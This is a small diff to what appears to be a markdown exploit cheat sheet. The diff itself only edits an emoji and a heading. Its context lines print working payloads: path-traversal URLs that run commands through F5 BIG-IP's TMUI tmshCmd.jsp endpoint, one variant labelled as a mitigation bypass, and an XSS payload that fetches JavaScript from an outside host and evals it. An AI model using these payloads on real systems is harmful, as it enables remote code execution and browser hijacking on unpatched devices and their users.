@@ -100,11 +100,11 @@ RCE
 ````
 https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=whoami
 ````
-or to bypass mitigation :rolls_eyes:
+or to bypass mitigation :eyes:
 
 ````https://<IP>/tmui/login.jsp/..%3b/tmui/locallb/workspace/tmshCmd.jsp?command=list````
 
-#### ropnop does javascript! xss source remote payload
+### @ropnop does javascript! xss source remote payload
 
 ````
 <svg/onload='fetch("//r0p.cc/a").then(r=>r.text().then(t=>eval(t)))'>
